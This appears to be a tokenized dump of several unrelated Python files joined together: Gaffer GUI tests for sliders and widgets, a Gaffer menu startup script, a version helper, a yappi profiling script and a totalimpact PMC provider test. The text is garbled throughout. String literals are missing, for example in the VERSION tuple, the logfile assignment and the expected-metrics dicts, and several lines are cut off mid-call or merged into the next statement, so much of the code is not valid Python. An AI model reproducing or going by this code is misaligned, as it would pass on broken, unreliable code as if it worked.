\n 
self . assertEqual ( len ( cs ) , 2 ) \n 
\n 
s . setValue ( 3 ) \n 
self . assertEqual ( s . getValue ( ) , 2 ) \n 
self . assertEqual ( s . getPosition ( ) , 1 ) \n 
\n 
\n 
# signal any changes. \n 
self . assertEqual ( len ( cs ) , 2 ) \n 
\n 
~~ def testPositionsOutsideRangeAreClamped ( self ) : \n 
\n 
~~~ s = GafferUI . NumericSlider ( value = 0.1 , min = 0 , max = 2 ) \n 
\n 
cs = GafferTest . CapturingSlot ( s . valueChangedSignal ( ) , s . positionChangedSignal ( ) ) \n 
\n 
s . setPosition ( 2 ) \n 
self . assertEqual ( s . getValue ( ) , 2 ) \n 
self . assertEqual ( s . getPosition ( ) , 1 ) \n 
\n 
self . assertEqual ( len ( cs ) , 2 ) \n 
\n 
s . setPosition ( 2 ) \n 
self . assertEqual ( s . getValue ( ) , 2 ) \n 
self . assertEqual ( s . getPosition ( ) , 1 ) \n 
\n 
\n 
# signal any changes. \n 
self . assertEqual ( len ( cs ) , 2 ) \n 
\n 
~~ def testHardRange ( self ) : \n 
\n 
~~~ s = GafferUI . NumericSlider ( value = 0.1 , min = 0 , max = 2 , hardMin = - 1 , hardMax = 3 ) \n 
self . assertEqual ( s . getRange ( ) , ( 0 , 2 , - 1 , 3 ) ) \n 
\n 
cs = GafferTest . CapturingSlot ( s . valueChangedSignal ( ) , s . positionChangedSignal ( ) ) \n 
\n 
s . setValue ( 3 ) \n 
self . assertEqual ( s . getValue ( ) , 3 ) \n 
self . assertEqual ( s . getPosition ( ) , 1.5 ) \n 
self . assertEqual ( len ( cs ) , 2 ) \n 
\n 
s . setValue ( 3.5 ) \n 
self . assertEqual ( s . getValue ( ) , 3 ) \n 
self . assertEqual ( s . getPosition ( ) , 1.5 ) \n 
self . assertEqual ( len ( cs ) , 2 ) \n 
\n 
s . setValue ( - 1 ) \n 
self . assertEqual ( s . getValue ( ) , - 1 ) \n 
self . assertEqual ( s . getPosition ( ) , - 0.5 ) \n 
self . assertEqual ( len ( cs ) , 4 ) \n 
\n 
s . setValue ( - 2 ) \n 
self . assertEqual ( s . getValue ( ) , - 1 ) \n 
self . assertEqual ( s . getPosition ( ) , - 0.5 ) \n 
self . assertEqual ( len ( cs ) , 4 ) \n 
\n 
~~ def testSetRangeClampsValue ( self ) : \n 
\n 
~~~ s = GafferUI . NumericSlider ( value = 0.5 , min = 0 , max = 2 ) \n 
\n 
self . assertEqual ( s . getPosition ( ) , 0.25 ) \n 
self . assertEqual ( s . getValue ( ) , 0.5 ) \n 
\n 
s . setRange ( 1 , 2 ) \n 
self . assertEqual ( s . getPosition ( ) , 0 ) \n 
self . assertEqual ( s . getValue ( ) , 1 ) \n 
\n 
~~ def testMultipleValues ( self ) : \n 
\n 
~~~ self . assertRaises ( Exception , GafferUI . NumericSlider , value = 0 , values = [ 1 , 2 ] ) \n 
\n 
s = GafferUI . NumericSlider ( values = [ 1 , 1.5 ] , min = 0 , max = 2 ) \n 
self . assertEqual ( s . getValues ( ) , [ 1 , 1.5 ] ) \n 
self . assertEqual ( s . getPositions ( ) , [ 0.5 , 0.75 ] ) \n 
self . assertRaises ( ValueError , s . getValue ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2011-2012, John Haddon. All rights reserved. \n 
#  Copyright (c) 2011-2015, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ import unittest \n 
import weakref \n 
import sys \n 
\n 
import IECore \n 
\n 
import Gaffer \n 
import GafferTest \n 
\n 
import GafferUI \n 
import GafferUITest \n 
\n 
QtCore = GafferUI . _qtImport ( "QtCore" ) \n 
QtGui = GafferUI . _qtImport ( "QtGui" ) \n 
\n 
class TestWidget ( GafferUI . Widget ) : \n 
\n 
~~~ def __init__ ( self , ** kw ) : \n 
\n 
~~~ GafferUI . Widget . __init__ ( self , QtGui . QLabel ( "hello" ) , ** kw ) \n 
\n 
~~ ~~ class TestWidget2 ( GafferUI . Widget ) : \n 
\n 
~~~ def __init__ ( self ) : \n 
\n 
~~~ self . topLevelGafferWidget = TestWidget ( ) \n 
\n 
GafferUI . Widget . __init__ ( self , self . topLevelGafferWidget ) \n 
\n 
~~ ~~ class WidgetTest ( GafferUITest . TestCase ) : \n 
\n 
~~~ def testOwner ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
self . assert_ ( GafferUI . Widget . _owner ( w . _qtWidget ( ) ) is w ) \n 
\n 
~~ def testParent ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
self . assert_ ( w . parent ( ) is None ) \n 
\n 
~~ def testCanDie ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
\n 
wr1 = weakref . ref ( w ) \n 
wr2 = weakref . ref ( w . _qtWidget ( ) ) \n 
\n 
del w \n 
self . assert_ ( wr1 ( ) is None ) \n 
self . assert_ ( wr2 ( ) is None ) \n 
\n 
~~ def testAncestor ( self ) : \n 
\n 
~~~ w = GafferUI . Window ( "test" ) \n 
l = GafferUI . ListContainer ( GafferUI . ListContainer . Orientation . Vertical ) \n 
p = GafferUI . SplitContainer ( ) \n 
l . append ( p ) \n 
\n 
w . setChild ( l ) \n 
\n 
self . assert_ ( p . ancestor ( GafferUI . ListContainer ) is l ) \n 
self . assert_ ( p . ancestor ( GafferUI . Window ) is w ) \n 
self . assert_ ( p . ancestor ( GafferUI . Menu ) is None ) \n 
\n 
~~ def testIsAncestorOf ( self ) : \n 
\n 
~~~ with GafferUI . Window ( "test" ) as w : \n 
~~~ with GafferUI . SplitContainer ( ) as p : \n 
~~~ with GafferUI . ListContainer ( ) as l1 : \n 
~~~ b1 = GafferUI . Button ( ) \n 
~~ with GafferUI . ListContainer ( ) as l2 : \n 
~~~ b2 = GafferUI . Button ( ) \n 
\n 
~~ ~~ ~~ self . assertTrue ( l2 . isAncestorOf ( b2 ) ) \n 
self . assertFalse ( l1 . isAncestorOf ( b2 ) ) \n 
self . assertTrue ( p . isAncestorOf ( b2 ) ) \n 
self . assertTrue ( w . isAncestorOf ( b2 ) ) \n 
\n 
self . assertFalse ( b2 . isAncestorOf ( b1 ) ) \n 
self . assertFalse ( b2 . isAncestorOf ( l1 ) ) \n 
self . assertFalse ( b2 . isAncestorOf ( l2 ) ) \n 
self . assertFalse ( b2 . isAncestorOf ( p ) ) \n 
self . assertFalse ( b2 . isAncestorOf ( w ) ) \n 
\n 
self . assertTrue ( l1 . isAncestorOf ( b1 ) ) \n 
self . assertFalse ( l2 . isAncestorOf ( b1 ) ) \n 
self . assertTrue ( p . isAncestorOf ( b1 ) ) \n 
self . assertTrue ( w . isAncestorOf ( b1 ) ) \n 
\n 
~~ def testGafferWidgetAsTopLevel ( self ) : \n 
\n 
~~~ w = TestWidget2 ( ) \n 
\n 
self . assert_ ( GafferUI . Widget . _owner ( w . _qtWidget ( ) ) is w ) \n 
self . assert_ ( w . topLevelGafferWidget . parent ( ) is w ) \n 
self . assert_ ( GafferUI . Widget . _owner ( w . topLevelGafferWidget . _qtWidget ( ) ) is not w ) \n 
\n 
~~ def testToolTip ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
self . assertEqual ( w . getToolTip ( ) , "" ) \n 
\n 
w = TestWidget ( toolTip = "hi" ) \n 
self . assertEqual ( w . getToolTip ( ) , "hi" ) \n 
\n 
w . setToolTip ( "a" ) \n 
self . assertEqual ( w . getToolTip ( ) , "a" ) \n 
\n 
~~ def testEnabledState ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
self . assertEqual ( w . getEnabled ( ) , True ) \n 
self . assertEqual ( w . enabled ( ) , True ) \n 
\n 
w . setEnabled ( False ) \n 
self . assertEqual ( w . getEnabled ( ) , False ) \n 
self . assertEqual ( w . enabled ( ) , False ) \n 
\n 
w . setEnabled ( True ) \n 
self . assertEqual ( w . getEnabled ( ) , True ) \n 
self . assertEqual ( w . enabled ( ) , True ) \n 
\n 
~~ def testDisabledWidgetsDontGetSignals ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
\n 
def f ( w , event ) : \n 
\n 
~~~ WidgetTest . signalsEmitted += 1 \n 
\n 
~~ c = w . buttonPressSignal ( ) . connect ( f ) \n 
\n 
WidgetTest . signalsEmitted = 0 \n 
\n 
event = QtGui . QMouseEvent ( QtCore . QEvent . MouseButtonPress , QtCore . QPoint ( 0 , 0 ) , QtCore . Qt . LeftButton \n 
QtGui . QApplication . instance ( ) . sendEvent ( w . _qtWidget ( ) , event ) \n 
self . assertEqual ( WidgetTest . signalsEmitted , 1 ) \n 
\n 
w . setEnabled ( False ) \n 
QtGui . QApplication . instance ( ) . sendEvent ( w . _qtWidget ( ) , event ) \n 
self . assertEqual ( WidgetTest . signalsEmitted , 1 ) \n 
\n 
w . setEnabled ( True ) \n 
QtGui . QApplication . instance ( ) . sendEvent ( w . _qtWidget ( ) , event ) \n 
self . assertEqual ( WidgetTest . signalsEmitted , 2 ) \n 
\n 
~~ def testCanDieAfterUsingSignals ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
\n 
wr1 = weakref . ref ( w ) \n 
wr2 = weakref . ref ( w . _qtWidget ( ) ) \n 
\n 
w . buttonPressSignal ( ) \n 
w . buttonReleaseSignal ( ) \n 
w . mouseMoveSignal ( ) \n 
w . wheelSignal ( ) \n 
\n 
del w \n 
self . assert_ ( wr1 ( ) is None ) \n 
self . assert_ ( wr2 ( ) is None ) \n 
\n 
~~ def testVisibility ( self ) : \n 
\n 
~~~ with GafferUI . Window ( ) as w : \n 
~~~ with GafferUI . ListContainer ( ) as l : \n 
~~~ t = TestWidget ( ) \n 
\n 
~~ ~~ self . assertEqual ( w . getVisible ( ) , False ) \n 
self . assertEqual ( l . getVisible ( ) , True ) \n 
self . assertEqual ( t . getVisible ( ) , True ) \n 
self . assertEqual ( w . visible ( ) , False ) \n 
self . assertEqual ( l . visible ( ) , False ) \n 
self . assertEqual ( t . visible ( ) , False ) \n 
\n 
w . setVisible ( True ) \n 
self . assertEqual ( w . getVisible ( ) , True ) \n 
self . assertEqual ( l . getVisible ( ) , True ) \n 
self . assertEqual ( t . getVisible ( ) , True ) \n 
self . assertEqual ( w . visible ( ) , True ) \n 
self . assertEqual ( l . visible ( ) , True ) \n 
self . assertEqual ( t . visible ( ) , True ) \n 
\n 
w . setVisible ( False ) \n 
self . assertEqual ( w . getVisible ( ) , False ) \n 
self . assertEqual ( l . getVisible ( ) , True ) \n 
self . assertEqual ( t . getVisible ( ) , True ) \n 
self . assertEqual ( w . visible ( ) , False ) \n 
self . assertEqual ( l . visible ( ) , False ) \n 
self . assertEqual ( t . visible ( ) , False ) \n 
self . assertEqual ( t . visible ( relativeTo = l ) , True ) \n 
self . assertEqual ( t . visible ( relativeTo = w ) , True ) \n 
\n 
w . setVisible ( True ) \n 
t . setVisible ( False ) \n 
self . assertEqual ( t . getVisible ( ) , False ) \n 
self . assertEqual ( t . visible ( ) , False ) \n 
self . assertEqual ( t . visible ( relativeTo = l ) , False ) \n 
\n 
~~ def testGetVisibleForNewWidgets ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
self . assertEqual ( w . getVisible ( ) , True ) \n 
\n 
~~ def testVisibilityOfParentlessWidgets ( self ) : \n 
\n 
~~~ w = GafferUI . Window ( ) \n 
t = TestWidget ( ) \n 
\n 
# windows must be explicitly shown \n 
self . assertEqual ( w . getVisible ( ) , False ) \n 
self . assertEqual ( w . visible ( ) , False ) \n 
\n 
\n 
# must not be visible on screen until parented \n 
# to a window \n 
self . assertEqual ( t . getVisible ( ) , True ) \n 
self . assertEqual ( t . visible ( ) , False ) \n 
\n 
w . setVisible ( True ) \n 
self . assertEqual ( w . getVisible ( ) , True ) \n 
self . assertEqual ( w . visible ( ) , True ) \n 
\n 
w . setChild ( t ) \n 
self . assertEqual ( t . getVisible ( ) , True ) \n 
self . assertEqual ( t . visible ( ) , True ) \n 
\n 
# removing a widget from its parent must not \n 
# leave it visible on screen. \n 
w . removeChild ( t ) \n 
self . assertEqual ( t . parent ( ) , None ) \n 
self . assertEqual ( t . getVisible ( ) , True ) \n 
self . assertEqual ( t . visible ( ) , False ) \n 
\n 
~~ def testVisibilityWhenTransferringWidgets ( self ) : \n 
\n 
~~~ w1 = GafferUI . Window ( ) \n 
w1 . setVisible ( True ) \n 
\n 
w2 = GafferUI . Window ( ) \n 
w2 . setVisible ( True ) \n 
\n 
v = TestWidget ( ) \n 
self . assertEqual ( v . getVisible ( ) , True ) \n 
self . assertEqual ( v . visible ( ) , False ) \n 
\n 
h = TestWidget ( ) \n 
self . assertEqual ( h . getVisible ( ) , True ) \n 
h . setVisible ( False ) \n 
self . assertEqual ( h . getVisible ( ) , False ) \n 
self . assertEqual ( h . visible ( ) , False ) \n 
\n 
w1 . setChild ( v ) \n 
self . assertEqual ( v . getVisible ( ) , True ) \n 
self . assertEqual ( v . visible ( ) , True ) \n 
\n 
self . assertEqual ( h . getVisible ( ) , False ) \n 
self . assertEqual ( h . visible ( ) , False ) \n 
\n 
w2 . setChild ( v ) \n 
self . assertEqual ( v . getVisible ( ) , True ) \n 
self . assertEqual ( v . visible ( ) , True ) \n 
\n 
self . assertEqual ( h . getVisible ( ) , False ) \n 
self . assertEqual ( h . visible ( ) , False ) \n 
\n 
w1 . setChild ( h ) \n 
self . assertEqual ( v . getVisible ( ) , True ) \n 
self . assertEqual ( v . visible ( ) , True ) \n 
\n 
self . assertEqual ( h . getVisible ( ) , False ) \n 
self . assertEqual ( h . visible ( ) , False ) \n 
\n 
w2 . setChild ( h ) \n 
self . assertEqual ( v . getVisible ( ) , True ) \n 
self . assertEqual ( v . visible ( ) , False ) \n 
\n 
self . assertEqual ( h . getVisible ( ) , False ) \n 
self . assertEqual ( h . visible ( ) , False ) \n 
\n 
~~ def testSignals ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
\n 
for s in [ \n 
( "keyPressSignal" , GafferUI . WidgetEventSignal ) , \n 
( "keyReleaseSignal" , GafferUI . WidgetEventSignal ) , \n 
( "buttonPressSignal" , GafferUI . WidgetEventSignal ) , \n 
( "buttonReleaseSignal" , GafferUI . WidgetEventSignal ) , \n 
( "buttonDoubleClickSignal" , GafferUI . WidgetEventSignal ) , \n 
( "mouseMoveSignal" , GafferUI . WidgetEventSignal ) , \n 
( "enterSignal" , GafferUI . WidgetSignal ) , \n 
( "leaveSignal" , GafferUI . WidgetSignal ) , \n 
( "wheelSignal" , GafferUI . WidgetEventSignal ) , \n 
( "visibilityChangedSignal" , GafferUI . WidgetSignal ) , \n 
( "contextMenuSignal" , GafferUI . WidgetSignal ) , \n 
( "parentChangedSignal" , GafferUI . WidgetSignal ) , \n 
] : \n 
\n 
~~~ self . failUnless ( isinstance ( getattr ( w , s [ 0 ] ) ( ) , s [ 1 ] ) ) \n 
self . failUnless ( getattr ( w , s [ 0 ] ) ( ) is getattr ( w , s [ 0 ] ) ( ) ) \n 
\n 
~~ ~~ def testBound ( self ) : \n 
\n 
~~~ w = GafferUI . Window ( borderWidth = 8 ) \n 
b = GafferUI . Button ( ) \n 
w . setChild ( b ) \n 
w . setVisible ( True ) \n 
\n 
w . setPosition ( IECore . V2i ( 100 ) ) \n 
\n 
self . waitForIdle ( 1000 ) \n 
\n 
wb = w . bound ( ) \n 
bb = b . bound ( ) \n 
bbw = b . bound ( relativeTo = w ) \n 
\n 
self . failUnless ( isinstance ( wb , IECore . Box2i ) ) \n 
self . failUnless ( isinstance ( bb , IECore . Box2i ) ) \n 
self . failUnless ( isinstance ( bbw , IECore . Box2i ) ) \n 
\n 
self . assertEqual ( bb . size ( ) , bbw . size ( ) ) \n 
self . assertEqual ( bbw . min , bb . min - wb . min ) \n 
self . assertEqual ( b . size ( ) , bb . size ( ) ) \n 
\n 
~~ def testParentChangedSignal ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
window = GafferUI . Window ( ) \n 
\n 
cs = GafferTest . CapturingSlot ( w . parentChangedSignal ( ) ) \n 
self . assertEqual ( len ( cs ) , 0 ) \n 
\n 
window . setChild ( w ) \n 
self . assertEqual ( len ( cs ) , 1 ) \n 
self . assertEqual ( cs [ 0 ] , ( w , ) ) \n 
\n 
window . setChild ( None ) \n 
self . assertEqual ( len ( cs ) , 2 ) \n 
self . assertEqual ( cs [ 1 ] , ( w , ) ) \n 
\n 
~~ def testHighlighting ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
self . assertEqual ( w . getHighlighted ( ) , False ) \n 
\n 
w . setHighlighted ( True ) \n 
self . assertEqual ( w . getHighlighted ( ) , True ) \n 
\n 
w . setHighlighted ( False ) \n 
self . assertEqual ( w . getHighlighted ( ) , False ) \n 
\n 
~~ def testWidgetAt ( self ) : \n 
\n 
~~~ with GafferUI . Window ( ) as w1 : \n 
~~~ t1 = GafferUI . TextWidget ( "hello" ) \n 
\n 
~~ with GafferUI . Window ( ) as w2 : \n 
~~~ t2 = GafferUI . TextWidget ( "hello" ) \n 
\n 
~~ w1 . setVisible ( True ) \n 
w2 . setVisible ( True ) \n 
\n 
w1 . setPosition ( IECore . V2i ( 100 ) ) \n 
w2 . setPosition ( IECore . V2i ( 300 ) ) \n 
\n 
self . waitForIdle ( 1000 ) \n 
\n 
self . assertTrue ( GafferUI . Widget . widgetAt ( w1 . bound ( ) . center ( ) ) is t1 ) \n 
self . assertTrue ( GafferUI . Widget . widgetAt ( w2 . bound ( ) . center ( ) ) is t2 ) \n 
self . assertTrue ( GafferUI . Widget . widgetAt ( w1 . bound ( ) . center ( ) , widgetType = GafferUI . Window ) is w1 self . assertTrue ( GafferUI . Widget . widgetAt ( w2 . bound ( ) . center ( ) , widgetType = GafferUI . Window ) is w2 \n 
~~ def testMousePosition ( self ) : \n 
\n 
~~~ w = GafferUI . Window ( borderWidth = 8 ) \n 
b = GafferUI . Button ( ) \n 
w . setChild ( b ) \n 
w . setVisible ( True ) \n 
\n 
w . setPosition ( IECore . V2i ( 100 ) ) \n 
\n 
self . waitForIdle ( 1000 ) \n 
\n 
mouseGlobal = GafferUI . Widget . mousePosition ( ) \n 
mouseLocal = GafferUI . Widget . mousePosition ( relativeTo = b ) \n 
\n 
self . assertEqual ( mouseGlobal , mouseLocal + b . bound ( ) . min ) \n 
\n 
~~ def testAddressAndObject ( self ) : \n 
\n 
~~~ button = GafferUI . Button ( ) \n 
address = GafferUI . _qtAddress ( button . _qtWidget ( ) ) \n 
self . assertTrue ( isinstance ( address , int ) ) \n 
widget = GafferUI . _qtObject ( address , QtGui . QPushButton ) \n 
self . assertTrue ( isinstance ( widget , QtGui . QPushButton ) ) \n 
\n 
~~ def testSetVisibleWithNonBool ( self ) : \n 
\n 
~~~ w = TestWidget ( ) \n 
self . assertTrue ( w . getVisible ( ) is True ) \n 
\n 
w . setVisible ( 0 ) \n 
self . assertTrue ( w . getVisible ( ) is False ) \n 
\n 
w . setVisible ( 1 ) \n 
self . assertTrue ( w . getVisible ( ) is True ) \n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ unittest . main ( ) \n 
########################################################################## \n 
# \n 
#  Copyright (c) 2015, Image Engine Design Inc. All rights reserved. \n 
# \n 
#  Redistribution and use in source and binary forms, with or without \n 
#  modification, are permitted provided that the following conditions are \n 
#  met: \n 
# \n 
#      * Redistributions of source code must retain the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer. \n 
# \n 
#      * Redistributions in binary form must reproduce the above \n 
#        copyright notice, this list of conditions and the following \n 
#        disclaimer in the documentation and/or other materials provided with \n 
#        the distribution. \n 
# \n 
#      * Neither the name of John Haddon nor the names of \n 
#        any other contributors to this software may be used to endorse or \n 
#        promote products derived from this software without specific prior \n 
#        written permission. \n 
# \n 
#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS \n 
#  IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, \n 
#  THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR \n 
#  PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR \n 
#  CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \n 
#  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, \n 
#  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR \n 
#  PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF \n 
#  LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING \n 
#  NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS \n 
#  SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. \n 
# \n 
########################################################################## \n 
\n 
~~ import GafferUI \n 
import GafferSceneUI \n 
\n 
def __toolMenu ( nodeEditor , node , menuDefinition ) : \n 
\n 
~~~ GafferUI . UIEditor . appendNodeEditorToolMenuDefinitions ( nodeEditor , node , menuDefinition ) \n 
GafferUI . BoxUI . appendNodeEditorToolMenuDefinitions ( nodeEditor , node , menuDefinition ) \n 
GafferSceneUI . FilteredSceneProcessorUI . appendNodeEditorToolMenuDefinitions ( nodeEditor , node , menuDefinition \n 
~~ __nodeEditorToolMenuConnection = GafferUI . NodeEditor . toolMenuSignal ( ) . connect ( __toolMenu ) \n 
VERSION = ( 0 , 1 , 0 , , 1 ) \n 
__version__ = . join ( map ( str , VERSION ) ) \n 
\n 
def get_version ( ) : \n 
~~~ version = % ( VERSION [ 0 ] , VERSION [ 1 ] ) \n 
if VERSION [ 2 ] : \n 
~~~ version = % ( version , VERSION [ 2 ] ) \n 
~~ if VERSION [ 3 : ] == ( , 0 ) : \n 
~~~ version = % version \n 
~~ else : \n 
~~~ if VERSION [ 3 ] != : \n 
~~~ version = % ( version , VERSION [ 3 ] , VERSION [ 4 ] ) \n 
~~ ~~ return version \n 
# in ipython or similar \n 
\n 
~~ import yappi \n 
import os \n 
from totalimpact import backend \n 
\n 
rootdir = "." \n 
logfile = \n 
\n 
\n 
yappi . clear_stats ( ) \n 
yappi . start ( ) \n 
backend . main ( logfile ) \n 
\n 
### Now, in another window run \n 
# ./services/api start \n 
# ./services/proxy start \n 
# ./extras/functional_test.py -i 6 -n 6 \n 
# then when it is done, in python do a Cntl C to stop the backend and return to python prompt \n 
\n 
yappi . stop ( ) \n 
\n 
yappi . print_stats ( sort_type = yappi . SORTTYPE_TTOT , limit = 30 , thread_stats_on = False ) \n 
import os , collections , simplejson \n 
\n 
from totalimpact import db , app \n 
from totalimpact . providers import pmc \n 
from test . unit_tests . providers import common \n 
from test . unit_tests . providers . common import ProviderTestCase \n 
from totalimpact . providers . provider import Provider , ProviderContentMalformedError , ProviderFactory \n 
from totalimpact import provider_batch_data \n 
from test . utils import http \n 
from test . utils import setup_postgres_for_unittests , teardown_postgres_for_unittests \n 
\n 
from nose . tools import assert_equals , raises , nottest , assert_items_equal \n 
\n 
datadir = os . path . join ( os . path . split ( __file__ ) [ 0 ] , "../../../extras/sample_provider_pages/pmc" ) \n 
SAMPLE_EXTRACT_METRICS_PAGE = os . path . join ( datadir , "monthly_download" ) \n 
SAMPLE_EXTRACT_METRICS_PAGE_DIFFERENT_MONTH = os . path . join ( datadir , "monthly_download_different_month" \n 
TEST_PMID = "23066504" \n 
\n 
class TestPmc ( ProviderTestCase ) : \n 
\n 
~~~ provider_name = "pmc" \n 
\n 
testitem_aliases = ( "pmid" , TEST_PMID ) \n 
testitem_metrics = ( "pmid" , TEST_PMID ) \n 
\n 
def setUp ( self ) : \n 
~~~ ProviderTestCase . setUp ( self ) \n 
\n 
self . db = setup_postgres_for_unittests ( db , app ) \n 
\n 
sample_data_dump = open ( SAMPLE_EXTRACT_METRICS_PAGE , "r" ) . read ( ) \n 
sample_data_dump_different_month = open ( SAMPLE_EXTRACT_METRICS_PAGE_DIFFERENT_MONTH , "r" ) . read \n 
test_monthly_data = [ \n 
{ "_id" : "abc" , \n 
"type" : "provider_data_dump" , \n 
"provider" : "pmc" , \n 
"raw" : sample_data_dump , \n 
"provider_raw_version" : 1.0 , \n 
"created" : "2012-11-29T07:34:01.126892" , \n 
"aliases" : { "pmid" : [ "111" , "222" ] } , \n 
"min_event_date" : "2012-10-01T07:34:01.126892" , \n 
"max_event_date" : "2012-10-31T07:34:01.126892" \n 
} , \n 
{ "_id" : "def" , \n 
"type" : "provider_data_dump" , \n 
"provider" : "pmc" , \n 
"raw" : sample_data_dump_different_month , \n 
"provider_raw_version" : 1.0 , \n 
"created" : "2012-11-29T08:34:01.126892" , \n 
"aliases" : { "pmid" : [ "111" ] } , \n 
"min_event_date" : "2012-01-01T07:34:01.126892" , \n 
"max_event_date" : "2012-01-31T07:34:01.126892" \n 
} , \n 
{ \n 
"_id" : "abc123" , \n 
"raw" : "max_event_date" : "2012-10-31T07:34:01.126892" , \n 
"provider" : "pmc" , \n 
"aliases" : { \n 
"pmid" : [ \n 
"23066504" , \n 
"23066507" , \n 
"23066508" , \n 
"23066509" , \n 
"23066506" , \n 
"23066503" , \n 
"23066510" , \n 
"23071903" , \n 
"23110253" , \n 
"23066505" , \n 
"23110254" , \n 
"23110255" , \n 
"23110252" \n 
] \n 
} , \n 
"provider_raw_version" : 1 , \n 
"type" : "provider_data_dump" , \n 
"min_event_date" : "2012-10-02T07:34:01.126892" , \n 
"created" : "2012-11-29T09:34:01.126892" \n 
} \n 
] \n 
#print test_monthly_data \n 
for doc in test_monthly_data : \n 
~~~ new_object = provider_batch_data . create_objects_from_doc ( doc ) \n 
print new_object \n 
\n 
~~ self . provider = pmc . Pmc ( ) \n 
print "after pmc" \n 
\n 
~~ def tearDown ( self ) : \n 
~~~ teardown_postgres_for_unittests ( self . db ) \n 
\n 
\n 
~~ def test_has_applicable_batch_data_true ( self ) : \n 
# ensure that it matches an appropriate ids \n 
~~~ response = self . provider . has_applicable_batch_data ( "pmid" , "111" ) \n 
assert_equals ( response , True ) \n 
\n 
~~ def test_has_applicable_batch_data_false ( self ) : \n 
# ensure that it matches an appropriate ids \n 
~~~ response = self . provider . has_applicable_batch_data ( "pmid" , "notapmidintheview" ) \n 
assert_equals ( response , False ) \n 
\n 
~~ def test_build_batch_data_dict ( self ) : \n 
# ensure that it matches an appropriate ids \n 
~~~ response = self . provider . build_batch_data_dict ( ) \n 
#print response \n 
print response . keys ( ) \n 
expected = [ ( , ) , ( , ) , ( , ) , ( , assert_items_equal ( response . keys ( ) , expected ) \n 
\n 
~~ def test_is_relevant_alias ( self ) : \n 
# ensure that it matches an appropriate ids \n 
~~~ assert_equals ( self . provider . is_relevant_alias ( self . testitem_aliases ) , True ) \n 
\n 
~~ def test_extract_metrics_success ( self ) : \n 
~~~ f = open ( SAMPLE_EXTRACT_METRICS_PAGE , "r" ) \n 
good_page = f . read ( ) \n 
metrics_dict = self . provider . _extract_metrics ( good_page , id = "222" ) \n 
print metrics_dict \n 
expected = { : 514 , : 230 , : 606 , assert_equals ( metrics_dict , expected ) \n 
\n 
~~ def test_provider_metrics_500 ( self ) : \n 
~~~ pass # Not applicable \n 
\n 
~~ def test_provider_metrics_400 ( self ) : \n 
~~~ pass # Not applicable \n 
\n 
~~ def test_provider_metrics_nonsense_xml ( self ) : \n 
~~~ pass # Not applicable \n 
\n 
~~ def test_provider_metrics_nonsense_txt ( self ) : \n 
~~~ pass # Not applicable \n 
\n 
~~ def test_provider_metrics_empty ( self ) : \n 
~~~ pass # Not applicable \n 
\n 
~~ @ http \n 
def test_metrics ( self ) : \n 
~~~ metrics_dict = self . provider . metrics ( [ ( "pmid" , "222" ) ] ) \n 
expected = { : ( 514 , ) , : ( 230 , ) , print metrics_dict \n 
for key in expected : \n 
